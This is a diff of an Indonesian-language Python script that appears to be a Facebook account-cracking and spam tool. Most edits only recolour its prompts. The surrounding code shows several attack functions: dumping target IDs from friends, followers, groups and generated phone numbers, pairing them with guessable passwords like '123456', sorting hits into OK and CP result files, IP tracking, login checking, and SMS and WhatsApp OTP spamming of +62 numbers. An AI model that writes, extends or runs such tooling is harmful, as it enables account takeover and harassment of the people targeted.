@@ -3,6 +3,7 @@
 # Izin dlu lah bro kalau mau recode, gk ngotak njir_-
 #Jangan Di Decompile anjir kagak ngotak goblok
 # Note : jangan di ubah lagi! nanti error, script nya udah enak
+#Recode Sc Orang Kagak Buat Lu Jago Dek
 #-----------------[ IMPORT - PREMIUM ]-------------------
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -522,10 +523,10 @@ def menu(my_name,my_id):
 		time.sleep(5)
 		login()
 	else:
-		print(' [+]\33[1;91m Pilih Yang Bener Asu ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pilih Yang Bener Asu ')
 		back()
 def error():
-	print(f' [+]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
+	print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
 	time.sleep(4)
 	back() 
 #----------------HEADERSS-----------------#
@@ -537,7 +538,7 @@ def siu():
 def lacak_ip():
     b = input(f' \x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukkan IP Target : \x1b[1;93m')
     if b in [""]:
-        jalan("\nIsi Yang Benar !")
+        jalan("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Isi Yang Benar !")
         menu()
     a = requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
     try:
@@ -602,7 +603,7 @@ def crack_nomor():
 		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
 		if D in dump:pass
 		else:dump.append(D+'|123456')
-		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+		sys.stdout.write(f"\r \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
 		time.sleep(0.0000003)
 	setting()
 #-------------------[ DOA HALAL ]-----------------------#
@@ -613,11 +614,11 @@ def doa_halal():
 def crack_file():
 	try:vin = os.listdir('DUMP')
 	except FileNotFoundError:
-		print(' [+] \x1b[1;91mFile Tidak Ditemukan ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mFile Tidak Ditemukan ')
 		time.sleep(2)
 		back()
 	if len(vin)==0:
-		print(' [+] \x1b[1;91mKamu Tidak Memiliki File Dump ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mKamu Tidak Memiliki File Dump ')
 		time.sleep(2)
 		back()
 	else:
@@ -635,16 +636,16 @@ def crack_file():
 			else:
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input(' [+] \x1b[1;96mPilih :\x1b[1;97m ')
+				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
+		geeh = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mPilih :\x1b[1;97m ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f' [+] \x1b[1;91mPilih Yang Bener Kontol {x}')
+			print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mPilih Yang Bener Kontol {x}')
 			time.sleep(3)
 			back()
 		try:lin = open('DUMP/'+geh,'r').read().splitlines()
 		except:
-			print(' [+] \x1b[1;91mFile Tidak Ditemukan, Coba Lagi Nanti ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mFile Tidak Ditemukan, Coba Lagi Nanti ')
 			time.sleep(2)
 			back()
 		for xid in lin:
@@ -727,17 +728,17 @@ def pengikut():
 		for pi in koh2['subscribers']['data']:
 			try:
 			    id.append(pi['id']+'|'+pi['name'])
-			    sys.stdout.write(f"\r {P}[{H}+{P}] \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    sys.stdout.write(f"\r \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
 			    time.sleep(0.0002)
 			except:continue
 		print("\r")
-		cetak(panel(f"\33[1;96mBerhasil Mengumpulkan {len(id)} Idz",width=90,title=f"[bold red][[bold green] Mengumpulkan Idz [bold red]] ",style=f"bold red"))
+		cetak(panel(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;96mBerhasil Mengumpulkan {len(id)} Idz",width=90,title=f"[bold red][[bold green] Mengumpulkan Idz [bold red]] ",style=f"bold red"))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(f" [+] \33[1;91mKoneksi Internet Anda Bermasalah")
+		print(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mKoneksi Internet Anda Bermasalah")
 		time.sleep(3);exit()
 	except (KeyError,IOError):
-		print(f" [+] \33[1;91mGagal Dump Id, Kemungkinan Akun Private")
+		print(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mGagal Dump Id, Kemungkinan Akun Private")
 		time.sleep(3);exit()
 #------------------[ DEFF SPAM SMS ]-------------------#
 
@@ -1114,7 +1115,7 @@ class sxp_sms:
 		self.sms_otp_12(nomor)
 		self.sms_otp_13(nomor)
 		self.sms_otp_14(nomor)
-		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold red"))
+		cetak(panel(f"[bold cyan] Sukses Spam SMS Ke No : [bold yellow]+62{nomor}",width=90,padding=(0,2),style=f"bold red"))
 
 #------------------[ DEFF SPAM WA ]-------------------# 
 
@@ -1269,7 +1270,7 @@ class sxp_wa:
 		self.wa_otp_4(nomor)
 		self.wa_otp_5(nomor)
 		self.wa_otp_6(nomor)
-		cetak(panel(f" \33[1;96mSukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold red"))
+		cetak(panel(f" [bold cyan] Sukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold red"))
 #----------------------[ CRACK USERNAME ]----------------------#
 def crack_nama():
 	nama = []
@@ -1348,7 +1349,7 @@ def crack_group():
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [+] \33[1;91m Gagal Dump Id Grup, Kemungkinan Grup Private')
+		exit(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91m Gagal Dump Id Grup, Kemungkinan Grup Private')
 	setting()
 
 def dump_grup(url):
@@ -1376,11 +1377,11 @@ def result():
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print(' [+] \33[1;91m File Tidak Di Temukan ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91m File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print(' [+] \33[1;96mAnda Tidak Memiliki Hasil CP ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mAnda Tidak Memiliki Hasil CP ')
 			time.sleep(4)
 			back()
 		else:
@@ -1401,11 +1402,11 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+] \33[1;91mPilih Yang Bener Kontol ')
+				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mPilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(' [+]\33[1;96mFile Tidak Di Temukan ')
+				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m File Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1419,11 +1420,11 @@ def result():
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' [+]\33[1;91m File Tidak Di Temukan ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m File Tidak Di Temukan ')
 			time.sleep(4)
 			back()
 		if len(vin)==0:
-			print(' [+]\33[1;91m Anda Tidak Mempunyai File OK ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Anda Tidak Mempunyai File OK ')
 			time.sleep(4)
 			back()
 		else:
@@ -1441,14 +1442,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n [+]\33[1;96m Pilih : ')
+			geeh = input('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;96m Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
+				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print('[+]\33[1;91m File Tidak Di Temukan ')
+				print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m File Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1463,7 +1464,7 @@ def result():
 	elif kz in ['3','03']:
 		back()
 	else:
-		print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pilih Yang Bener Kontol ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def xyzoncrackpublik():
@@ -1483,10 +1484,10 @@ def xyzoncrackpublik():
 		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(' [+]\33[1;91m Internet Lu Gak Ada Anjing')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Internet Lu Gak Ada Anjing')
 		exit()
 	except (KeyError,IOError):
-		print(' [+]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
 		exit()
 #-------------------[ CRACK-MASAL ]----------------#
 def dump_massal():
@@ -1499,10 +1500,10 @@ def dump_massal():
 		cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
 		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
 	except ValueError:
-		print(' [+]\33[1;91m Wrong input ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Wrong input ')
 		exit()
 	if jum<1 or jum>80:
-		print(f' [+]\33[1;91m Pertemanan Tidak Publik  ')
+		print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pertemanan Tidak Publik  ')
 		exit()
 	ses=requests.Session()
 	yz = 0
@@ -1522,7 +1523,7 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print(' [+]\33[1;96m Unstable Signal ')
+			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Unstable Signal ')
 			exit()
 	try:
 		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
@@ -1532,7 +1533,7 @@ def dump_massal():
 		print(' {P}[{H}+{P}]\33[1;96m Unstable Signal ')
 		back()
 	except (KeyError,IOError):
-		print(f' [+]\33[1;91m Friendship Not Public {x}')
+		print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Friendship Not Public {x}')
 		time.sleep(3)
 		back()
 
@@ -1559,7 +1560,7 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' [+] \33[1;91mPilih Yang Bener Kontooll ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91mPilih Yang Bener Kontooll ')
 		exit()
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Metode Mobile  [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Metode Mbasic [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Metode Free [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Metode B-Api [bold white][[bold green]Very Fast[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Metode Async [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Metode Reguler [bold white][[bold green]Slow[bold white]][/]',width=90,title=f"[bold red][[bold green] Setting Metode [bold red]]",style=f"bold red"))
 	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode :{P} ')
@@ -2107,7 +2108,7 @@ def opsi():
 	CP = ("CP/")
 	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
 	if romi == "":
-		print(" [+] \33[1;96mIsi Yang Benar ");jeda(2)
+		print(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;96mIsi Yang Benar ");jeda(2)
 		back()
 	try:
 		file_cp = open(CP+romi, "r").readlines()
@@ -2211,7 +2212,7 @@ def mengecek(user,pw):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
 		print("%s \33[1;96m %s"%(M,oh))
 	else:
-		print("%s [+] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
+		print("%s \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
 		  
 def scarpping_ua():
     # Url & Headers website #
@@ -2380,7 +2381,6 @@ class get_data_web:
             except Exception as e: continue
         print('    }')
         print("cookie = requests.Session().cookies.get_dict()")
-        print("next = '%s'"%(post))
         print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#Gak Boleh Di Ubah yg Di bawah Ini kontol
